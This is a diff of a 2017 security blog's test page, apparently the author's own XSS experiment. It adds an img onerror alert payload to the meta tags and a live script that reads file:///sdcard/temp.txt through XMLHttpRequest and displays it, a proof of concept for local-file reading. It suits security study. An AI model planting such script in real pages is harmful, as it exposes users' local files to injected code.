@@ -8,17 +8,17 @@
   <link rel="dns-prefetch" href="https://adrain09.github.io">
   <title>test | NoSec World</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="1&amp;lt;img src=x onerror=alert(1)&amp;gt;">
+  <meta name="description" content="12345678910111213141516171819202122232425&amp;lt;img src=x onerror=alert(1)&amp;gt;&amp;lt;script&amp;gt;var xmlhttp;if (window.XMLHttpRequest)  &amp;#123;// code for IE7+, Firefox, Chrome, Opera, Safari  xmlhttp=new XML">
 <meta property="og:type" content="article">
 <meta property="og:title" content="test">
 <meta property="og:url" content="https://adrain09.github.io/2017/03/07/web安全/test/index.html">
 <meta property="og:site_name" content="NoSec World">
-<meta property="og:description" content="1&amp;lt;img src=x onerror=alert(1)&amp;gt;">
+<meta property="og:description" content="12345678910111213141516171819202122232425&amp;lt;img src=x onerror=alert(1)&amp;gt;&amp;lt;script&amp;gt;var xmlhttp;if (window.XMLHttpRequest)  &amp;#123;// code for IE7+, Firefox, Chrome, Opera, Safari  xmlhttp=new XML">
 <meta property="og:image" content="https://adrain09.github.io/2017/03/07/web安全/test/x">
-<meta property="og:updated_time" content="2017-03-07T05:43:44.000Z">
+<meta property="og:updated_time" content="2017-03-07T05:50:17.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="test">
-<meta name="twitter:description" content="1&amp;lt;img src=x onerror=alert(1)&amp;gt;">
+<meta name="twitter:description" content="12345678910111213141516171819202122232425&amp;lt;img src=x onerror=alert(1)&amp;gt;&amp;lt;script&amp;gt;var xmlhttp;if (window.XMLHttpRequest)  &amp;#123;// code for IE7+, Firefox, Chrome, Opera, Safari  xmlhttp=new XML">
 <meta name="twitter:image" content="https://adrain09.github.io/2017/03/07/web安全/test/x">
   
     <link rel="alternative" href="/atom.xml" title="NoSec World" type="application/atom+xml">
@@ -195,8 +195,31 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></div></pre></td></tr></table></figure>
+        <figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line">var xmlhttp;</div><div class="line">if (window.XMLHttpRequest)</div><div class="line">  &#123;// code for IE7+, Firefox, Chrome, Opera, Safari</div><div class="line">  xmlhttp=new XMLHttpRequest();</div><div class="line">  &#125;</div><div class="line">else</div><div class="line">  &#123;// code for IE6, IE5</div><div class="line">  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");</div><div class="line">  &#125;</div><div class="line"></div><div class="line">xmlhttp.open("GET","file:///sdcard/temp.txt",true);</div><div class="line">xmlhttp.send();</div><div class="line"></div><div class="line">xmlhttp.onreadystatechange=function()</div><div class="line">  &#123;</div><div class="line">  if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</div><div class="line">    &#123;</div><div class="line">        alert(1);</div><div class="line">    alert(xmlhttp.responseText);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
 <p><img src="/2017/03/07/web安全/test/x" onerror="alert(2)"></p>
+<script>
+var xmlhttp;
+if (window.XMLHttpRequest)
+  {// code for IE7+, Firefox, Chrome, Opera, Safari
+  xmlhttp=new XMLHttpRequest();
+  }
+else
+  {// code for IE6, IE5
+  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+  }
+
+xmlhttp.open("GET","file:///sdcard/temp.txt",true);
+xmlhttp.send();
+
+xmlhttp.onreadystatechange=function()
+  {
+  if (xmlhttp.readyState==4 && xmlhttp.status==200)
+    {
+        alert(2);
+    alert(xmlhttp.responseText);
+    }
+  }
+</script>
 
       
 
@@ -375,11 +398,11 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)">安全管理</a>
+                <a href="javascript:void(0)">随笔</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)">随笔</a>
+                <a href="javascript:void(0)">安全管理</a>
               </li>
              
               <li class="article-tag-list-item">
